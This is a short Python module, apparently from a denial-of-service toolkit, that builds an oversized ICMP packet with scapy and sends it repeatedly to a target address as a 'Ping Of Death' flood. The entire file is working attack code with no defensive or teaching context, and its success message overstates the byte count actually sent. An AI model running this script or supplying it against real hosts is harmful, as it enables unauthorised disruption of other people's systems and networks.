# Import modules
import random
from scapy.all import IP, ICMP, send, fragment
from colorama import Fore

__letters = list("1234567890qwertyuiopasdfghjklzxcvbnm")


def flood(target):
    payload = random.choice(__letters) * 60000
    packet = IP(dst=target[0]) / ICMP(id=65535, seq=65535) / payload

    for i in range(4):
        try:
            send(packet, verbose=False)
        except Exception as e:
            print(
                f"{Fore.RED}[!] {Fore.MAGENTA}Error while sending 'Ping Of Death'\n{Fore.MAGENTA}{e}{Fore.RESET}"
            )
        else:
            print(
                f"{Fore.GREEN}[+] {Fore.YELLOW}65535 bytes send to {target[0]} {Fore.RESET}"
            )
